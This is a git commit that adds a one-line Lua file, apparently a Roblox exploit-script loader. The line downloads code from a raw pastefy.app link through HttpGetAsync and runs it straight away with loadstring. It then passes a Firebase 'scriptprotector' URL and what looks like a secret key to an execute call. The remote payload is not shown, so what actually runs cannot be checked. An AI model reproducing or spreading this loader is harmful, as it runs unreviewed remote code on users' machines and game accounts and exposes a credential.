83b580cd9f039a915b457ba733e1cbccbb2ca01e
sam <brustvic1@gmail.com>
2025-08-18 16:28:51 -0300

    Create Main.lua

---
+++ public/twin/Main.lua
@@ -0,0 +1,1 @@
+loadstring(game:HttpGetAsync('https://pastefy.app/mJ8vapGJ/raw'))()execute("https://scriptprotector-d6fe7-default-rtdb.firebaseio.com/", "B4SraukVMMsjcGG2rAzqm2m0AkO5mY4bt3PkeNoo", "Script9")
